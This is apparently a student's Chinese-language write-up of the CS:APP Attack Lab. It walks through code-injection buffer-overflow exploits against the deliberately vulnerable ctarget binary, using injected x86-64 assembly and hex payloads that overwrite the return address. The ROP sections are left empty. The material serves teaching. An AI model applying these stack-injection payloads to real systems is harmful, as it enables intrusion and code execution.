# 介绍

## 实验目的

本实验旨在了解和学习缓冲区溢出攻击的两种方式：

* Code Injection Attacks(CI)：代码注入攻击
* Return-Oriented Programming(ROP): ROP攻击

## 文件介绍

* README.md: 文件描述；
* ctarget: 可执行文件，存在CI漏洞，完成实验phase 1-3；
* rtarget: 可执行文件，存在ROP漏洞，完成实验phase 4-5;
* hex2raw: 将十六进制转换为对应的输入字符串；
* cookie.txt: 实验中需要用到的8位十六进制数。
* farm.c: 

## 程序说明

ctarget和rtarget都会从标准输入中读取字符串，函数如下：

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

```

Gets类似于库函数gets，它会从标准输入读取字符串（“\n”作为结尾）存储到buf中，且不会检查缓冲区和字符串的长度，因而存在缓冲区溢出漏洞。

getbuf会在test中被调用：

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```



ctarget和rtarget的使用：

> Both CTARGET and RTARGET take several different command line arguments: 
>
> -h: Print list of possible command line arguments 
>
> -q: Don’t send results to the grading server 
>
> -i FILE: Supply input from a file, rather than from standard input

使用带上-q参数以避免远程服务器校验。



# 实验目标

## Part 1: Code Injection Attacks

ctarget被编译为固定栈地址且栈可执行，所以可以直接注入代码到栈上，并通过修改返回地址去执行注入代码。

### Phase 1：getbuf执行后去调用touch1，而不再是返回test；

程序中存在代码：

```c
void touch1()
{
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}

```



### Phase2: getbuf执行后去调用touch2;

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}

```

### Phase 3:  getbuf执行后去调用touch3;

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}


void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

## Part 2： Return-Oriented Programming

rtarget被编译为栈随机化，且栈不可执行。



### Phase 4: getbuf执行后去调用touch2;

### Phase 5: getbuf执行后去调用touch3;



# 实验过程

CI(phase 1)

使用objdump 反汇编看一下ctarget：

```shell
objdump -d ctarget
```

找到getbuf函数，如图。可以看到函数内部在栈上申请了40bytes的空间，而后调用Gets读取输入，并将之存储到栈上。

![image-20220806160116333](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208061601064.png)

回忆一下关于栈帧的知识，getbuf调用Gets时（执行到0x4017ac）的栈空间如图:

![image-20220807083753223](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807083800.png)

我们要去调用touch1，只需要将返回地址替换为touch1的地址即可。从汇编指令可以看出getbuf调用Gets传递的参数就是此时的栈顶（rsp），即Gets会将读取的输入字符串存入栈顶为起始的地址中，且存储时方向是从低地址到高地址的。那么此处只需要用40 Bytes填充栈，而后就可以覆盖掉返回地址。

另外此处程序采用小端序存储，所以输入指令地址时需要将低位放在内存中的低地址处。最终设计出输入字符串：

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

执行：

```shell
hex2raw <attack1.txt >attack1raw.txt
ctarget -q -i attack1raw.txt
```

结果：

![image-20220807114205671](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807114205.png)

CI(phase 2)

这次需要调用touch2，从源码可以看到，需要将cookie作为参数传递进去。

回忆一下，汇编中传递参数的方式：寄存器和栈，会依次使用rdi,rsi等寄存器传递参数，更多的参数会使用栈来进行传递。

所以此处传参只需要在调用touch2前将cookie放入寄存器rdi中即可。

所以此处需要做的是：

* 修改返回地址为touch2的地址
* 将cookie放入寄存器rdi

修改返回地址在Phase 1已经做过，只需覆盖即可，那么剩下的就是修改寄存器了。比较容易想到的两种操控寄存器的方法是编写汇编指令和利用已有指令，那么先整理一下目前的条件：

* 栈地址固定
* 栈可执行

那么想到一种方法：通过所以思路整理为：

* 控制返回地址

于是想到可以直接注入代码到栈上，通过注入代码操控寄存器的值，如此只需将返回地址修改为注入代码的地址、然后在注入代码中跳转touch2即可。

写出注入代码：

```assembly
mov $0x59b997fa, %rdi	;cookie存入rdi
push $0x4017ec			;touch2指令的地址入栈, 通过ret跳转到touch2
ret
```

编译这段代码，然后反汇编得到对应的十六进制串：

```shell
[root@machine target1]# gcc attack.s -c
[root@machine target1]# objdump -d attack.o

attack.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

另外还需要得到注入代码的内存地址（即getbuf中的栈顶地址），以确定返回地址。

使用gdb进行调试，首先看一下反汇编得到的指令地址，要得到getbuf中的栈顶地址，我们可以在mov %rsp, %rdi指令处打断点，对应的指令地址为0x4017ac:

![image-20220808213607260](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213607.png)

![image-20220808213859401](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213859.png)

从图中可以看到，执行到断点处时，rsp，即栈顶地址为0x5561dc78，这个地址也就是输入字符串的存储地址，自然也是注入代码的地址。

那么getbuf的返回地址也就是要替换为0x5561dc78即可，结合前面注入代码的是十六进制表示，最终可以得到整个输入字符串的十六进制表示：

```shell
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

执行：

```shell
hex2raw <attack2.txt >attack2raw.txt
ctarget -q -i attack2raw.txt
```

攻击成功：

![image-20220808214628387](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808214628.png)

CI(phase 3)

分析touch3的代码可以发现，touch3与touch2类似，仍旧是需要将cookie作为参数传递进去，但不同之处在于，touch2的参数类型为unsigned int，因此直接传递cookie本身即可，但touch3的参数类型为char *，需要将一个地址作为参数传递，并且需要将cookie转换为对应的ascii码。

目前需要做的是：

* 将cookie放进内存，这一步通过输入字符串即可将cookie放到栈上
* 将cookie的地址放进rdi，然后调用touch3
* 覆盖getbuf的返回地址

整理目前的条件：

* 栈可执行
* 栈地址固定
* 并且在刚刚的phase 2成功完成了一次代码注入

因此，最先想到的方法就是参考phase 2，注入代码操控rdi，写出注入代码：

```assembly
pushw $0x6166
pushw $0x3739
pushw $0x3962
pushw $0x3935
mov %rsp, %rdi
push $0x4018fa
ret
```

编译后反汇编查看相应指令的十六进制表示：

```shell
[root@localhost target1]# objdump -d attack3.o 

attack3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	66 68 66 61          	pushw  $0x6166
   4:	66 68 39 37          	pushw  $0x3739
   8:	66 68 62 39          	pushw  $0x3962
   c:	66 68 35 39          	pushw  $0x3935
  10:	48 89 e7             	mov    %rsp,%rdi
  13:	68 fa 18 40 00       	pushq  $0x4018fa
  18:	c3                   	retq
```

得到最终的输入：

```shell
66 68 66 61 66 68 39 37
66 68 62 39 66 68 35 39
48 89 e7 68 fa 18 40 00 
c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

执行：

![image-20220809180142844](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208091801966.png)

ROP(phase 1)

ROP(phase 2)
